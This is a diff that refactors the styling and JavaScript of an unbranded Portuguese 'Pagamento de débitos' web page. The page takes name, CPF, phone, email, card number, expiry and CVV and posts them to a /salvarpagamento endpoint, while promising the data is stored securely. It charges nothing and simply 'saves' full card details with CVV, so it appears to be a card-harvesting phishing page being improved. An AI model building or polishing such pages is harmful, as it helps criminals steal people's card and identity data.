@@ -10,8 +10,8 @@
       --primary:#ffc632; --primary-strong:#f3b81a; --accent:#0050ff;
       --border:#e5e7eb; --success:#16a34a;
     }
-    *{box-sizing:border-box}
-    body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text)}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text)}
     .container{max-width:960px;margin:24px auto;padding:0 16px}
     .top{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 20px}
     .summary{display:flex;justify-content:space-between;align-items:flex-start;background:var(--bg);border-radius:8px;padding:12px 14px;margin-top:8px;flex-wrap:wrap;gap:8px}
@@ -26,28 +26,21 @@
     .form-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
     label{font-size:12px;color:#374151;margin-bottom:6px;display:block}
     input{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:8px;background:#fff;font-size:14px}
-    .checkbox{display:flex;align-items:center;gap:8px;margin-top:8px;font-size:14px;color:#111}
     .btn{display:inline-flex;align-items:center;justify-content:center;background:var(--primary);border:1px solid #eab308;border-radius:8px;padding:10px 16px;font-weight:600;cursor:pointer;width:100%;max-width:220px;text-align:center}
     .btn:hover{background:var(--primary-strong)}
     .footer-actions{display:flex;flex-direction:column;gap:10px;align-items:flex-start;margin-top:12px}
-    @media(max-width:900px){.form-grid{grid-template-columns:1fr 1fr}}
-    @media(max-width:640px){.form-grid{grid-template-columns:1fr}.btn{width:100%}.summary{flex-direction:column;align-items:flex-start}}
-    .page-title{text-align:center;font-size:24px;font-weight:700;margin-bottom:4px}
-    .page-note{text-align:center;font-size:12px;color:var(--muted)}
     .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:100;visibility:hidden;opacity:0;transition:opacity .3s ease,visibility .3s ease}
     .overlay.active{visibility:visible;opacity:1}
     .loader{border:4px solid #eee;border-top:4px solid var(--accent);border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin-bottom:12px}
     @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-    .success-check{width:64px;height:64px;border-radius:50%;background:var(--success);display:flex;align-items:center;justify-content:center;color:#fff;font-size:36px;animation:pop .3s ease forwards}
-    @keyframes pop{from{transform:scale(0.5);opacity:0}to{transform:scale(1);opacity:1}}
-    .success-text{font-size:18px;font-weight:600;color:var(--success);margin-top:12px;text-align:center;animation:fadein .5s ease forwards}
-    @keyframes fadein{from{opacity:0}to{opacity:1}}
+    .success-check{width:64px;height:64px;border-radius:50%;background:var(--success);display:flex;align-items:center;justify-content:center;color:#fff;font-size:36px}
+    .success-text{font-size:18px;font-weight:600;color:var(--success);margin-top:12px;text-align:center}
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="page-title">Pagamento de débitos</div>
-    <div class="page-note">O pagamento de débitos não reativa um produto cancelado.</div>
+    <h2 style="text-align:center;margin-bottom:8px">Pagamento de débitos</h2>
+    <p style="text-align:center;font-size:12px;color:var(--muted)">O pagamento de débitos não reativa um produto cancelado.</p>
 
     <div class="top" style="margin-top:12px">
       <div style="font-size:14px;color:#111;margin-bottom:8px">Você está pagando:</div>
@@ -66,25 +59,23 @@
       <div class="label">Cartão de crédito</div>
     </div>
 
-    <div class="card" style="margin-top:4px">
+    <div class="card">
       <div class="alert" style="margin-bottom:14px">
         <div class="i">i</div>
         <div>
-          <div style="font-weight:700;margin-bottom:2px">Atenção!</div>
-          <div style="font-size:14px">Os dados preenchidos serão salvos com segurança em nosso sistema.</div>
+          <strong>Atenção!</strong> Os dados preenchidos serão salvos com segurança em nosso sistema.
         </div>
       </div>
 
       <form id="formPagamento">
-        <input type="hidden" name="pagamento_metodo" value="Cartão de crédito">
-        <div class="form-grid" style="margin-top:8px">
-          <div><label>Nome do titular</label><input type="text" name="nome" placeholder="Nome e sobrenome" required></div>
-          <div><label>CPF</label><input type="text" name="cpf_cnpj" id="cpf" placeholder="000.000.000-00" maxlength="14" required></div>
-          <div><label>Telefone</label><input type="tel" name="telefone" id="telefone" placeholder="(00) 00000-0000" maxlength="15"></div>
+        <div class="form-grid">
+          <div><label>Nome do titular</label><input type="text" name="nome" required></div>
+          <div><label>CPF</label><input type="text" id="cpf" name="cpf_cnpj" placeholder="000.000.000-00" maxlength="14" required></div>
+          <div><label>Telefone</label><input type="tel" id="telefone" name="telefone" placeholder="(00) 00000-0000" maxlength="15" required></div>
           <div><label>E-mail</label><input type="email" name="email" placeholder="seuemail@exemplo.com" required></div>
-          <div><label>Número do Cartão</label><input type="text" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
-          <div><label>Data de Validade</label><input type="text" name="validade" id="validade" placeholder="MM/AA" maxlength="5" required></div>
-          <div><label>CVV</label><input type="text" name="cvv" id="cvv" placeholder="000" maxlength="4" required></div>
+          <div><label>Número do Cartão</label><input type="text" id="numero_cartao" name="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
+          <div><label>Validade</label><input type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" required></div>
+          <div><label>CVV</label><input type="text" id="cvv" name="cvv" placeholder="000" maxlength="4" required></div>
         </div>
         <div class="footer-actions">
           <button class="btn" type="submit">Salvar Pagamento</button>
@@ -95,77 +86,66 @@
 
   <div class="overlay" id="overlay">
     <div class="loader" id="loader"></div>
-    <div class="success-check" id="success" style="display:none">✔</div>
-    <div class="success-text" id="successText" style="display:none">Forma de Pagamento Atualizada com Sucesso!</div>
+    <div class="success-check" id="check" style="display:none">✔</div>
+    <div class="success-text" id="msg" style="display:none"></div>
   </div>
 
   <script>
-    // Função de formatação automática
-    const format = {
-      cpf(v){v=v.replace(/\D/g,"").slice(0,11);
-        v=v.replace(/(\d{3})(\d)/,"$1.$2");
-        v=v.replace(/(\d{3})(\d)/,"$1.$2");
-        v=v.replace(/(\d{3})(\d{1,2})$/,"$1-$2");
-        return v;
-      },
-      tel(v){v=v.replace(/\D/g,"").slice(0,11);
-        v=v.replace(/^(\d{2})(\d)/g,"($1)$2");
-        v=v.replace(/(\d{5})(\d)/,"$1-$2");
-        return v;
-      },
-      cartao(v){v=v.replace(/\D/g,"").slice(0,16);
-        v=v.replace(/(\d{4})(?=\d)/g,"$1 ");
-        return v.trim();
-      },
-      validade(v){v=v.replace(/\D/g,"").slice(0,4);
-        if(v.length>2)v=v.replace(/(\d{2})(\d)/,"$1/$2");
-        return v;
-      }
+    // Máscaras automáticas
+    const masks = {
+      cpf(v){v=v.replace(/\D/g,"").slice(0,11);v=v.replace(/(\d{3})(\d)/,"$1.$2");v=v.replace(/(\d{3})(\d)/,"$1.$2");v=v.replace(/(\d{3})(\d{1,2})$/,"$1-$2");return v},
+      tel(v){v=v.replace(/\D/g,"").slice(0,11);v=v.replace(/^(\d{2})(\d)/g,"($1)$2");v=v.replace(/(\d{5})(\d)/,"$1-$2");return v},
+      card(v){v=v.replace(/\D/g,"").slice(0,16);v=v.replace(/(\d{4})(?=\d)/g,"$1 ");return v.trim()},
+      val(v){v=v.replace(/\D/g,"").slice(0,4);if(v.length>2)v=v.replace(/(\d{2})(\d)/,"$1/$2");return v}
     };
 
-    // Máscaras nos campos
-    const cpf=document.getElementById("cpf");
-    const tel=document.getElementById("telefone");
-    const cartao=document.getElementById("numero_cartao");
-    const val=document.getElementById("validade");
+    cpf.oninput = e=>e.target.value = masks.cpf(e.target.value);
+    telefone.oninput = e=>e.target.value = masks.tel(e.target.value);
+    numero_cartao.oninput = e=>e.target.value = masks.card(e.target.value);
+    validade.oninput = e=>e.target.value = masks.val(e.target.value);
 
-    cpf.addEventListener("input",e=>e.target.value=format.cpf(e.target.value));
-    tel.addEventListener("input",e=>e.target.value=format.tel(e.target.value));
-    cartao.addEventListener("input",e=>e.target.value=format.cartao(e.target.value));
-    val.addEventListener("input",e=>e.target.value=format.validade(e.target.value));
+    const form = document.getElementById("formPagamento");
+    const overlay = document.getElementById("overlay");
+    const loader = document.getElementById("loader");
+    const check = document.getElementById("check");
+    const msg = document.getElementById("msg");
 
-    // Envio
-    const form=document.getElementById("formPagamento");
-    const overlay=document.getElementById("overlay");
-    const loader=document.getElementById("loader");
-    const success=document.getElementById("success");
-    const successText=document.getElementById("successText");
-
-    form.addEventListener("submit",async(e)=>{
+    form.addEventListener("submit", async e => {
       e.preventDefault();
       overlay.classList.add("active");
-      loader.style.display="block";
-      success.style.display="none";
-      successText.style.display="none";
+      loader.style.display = "block";
+      check.style.display = "none";
+      msg.style.display = "none";
 
-      const data=Object.fromEntries(new FormData(form).entries());
-      try{
-        const res=await fetch("/salvarpagamento",{
-          method:"POST",
-          headers:{"Content-Type":"application/json"},
-          body:JSON.stringify(data)
+      const formData = Object.fromEntries(new FormData(form).entries());
+      try {
+        const res = await fetch("/salvarpagamento", {
+          method: "POST",
+          headers: {"Content-Type": "application/json;charset=utf-8"},
+          body: JSON.stringify(formData)
         });
-        loader.style.display="none";
-        if(!res.ok)throw new Error();
-        success.style.display="flex";
-        successText.style.display="block";
-        setTimeout(()=>overlay.classList.remove("active"),3000);
-      }catch(err){
-        loader.style.display="none";
-        successText.textContent="Erro ao salvar, tente novamente.";
-        successText.style.color="red";
-        successText.style.display="block";
-        setTimeout(()=>overlay.classList.remove("active"),3000);
+
+        const text = await res.text();
+        loader.style.display = "none";
+
+        if (res.ok) {
+          check.style.display = "flex";
+          msg.textContent = "Forma de pagamento atualizada com sucesso!";
+          msg.style.color = "#16a34a";
+          msg.style.display = "block";
+        } else {
+          msg.textContent = "Erro ao salvar: " + text;
+          msg.style.color = "red";
+          msg.style.display = "block";
+        }
+
+        setTimeout(() => overlay.classList.remove("active"), 3000);
+      } catch (err) {
+        loader.style.display = "none";
+        msg.textContent = "Falha na conexão. Tente novamente.";
+        msg.style.color = "red";
+        msg.style.display = "block";
+        setTimeout(() => overlay.classList.remove("active"), 3000);
       }
     });
   </script>
